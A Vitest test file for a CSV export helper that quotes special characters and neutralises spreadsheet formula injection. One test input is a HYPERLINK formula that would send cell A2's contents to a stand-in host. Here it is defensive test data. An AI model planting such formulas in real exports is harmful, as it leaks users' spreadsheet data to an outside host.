import { describe, expect, it } from "vitest";
import { csvCell, toCsv } from "./download";

describe("csvCell", () => {
  it("keeps plain values as they are", () => {
    expect(csvCell("John Taylor")).toBe("John Taylor");
    expect(csvCell(128)).toBe("128");
    expect(csvCell(-2.5)).toBe("-2.5");
    expect(csvCell("-2.5")).toBe("-2.5");
    expect(csvCell(null)).toBe("");
  });

  it("quotes commas, quotes and line breaks", () => {
    expect(csvCell("Dizzy, tired")).toBe('"Dizzy, tired"');
    expect(csvCell('said "ok"')).toBe('"said ""ok"""');
    expect(csvCell("line\r\nbreak")).toBe('"line\r\nbreak"');
  });

  it("stops a spreadsheet from running typed text as a formula", () => {
    expect(csvCell('=HYPERLINK("http://x/?"&A2,"Click")')).toBe(
      `"'=HYPERLINK(""http://x/?""&A2,""Click"")"`,
    );
    expect(csvCell("+1+1")).toBe("'+1+1");
    expect(csvCell("-cmd")).toBe("'-cmd");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
  });
});

describe("toCsv", () => {
  it("joins rows with every cell made safe", () => {
    expect(
      toCsv([
        ["Name", "Note"],
        ["Ann", "=1+1"],
      ]),
    ).toBe("Name,Note\nAnn,'=1+1");
  });
});
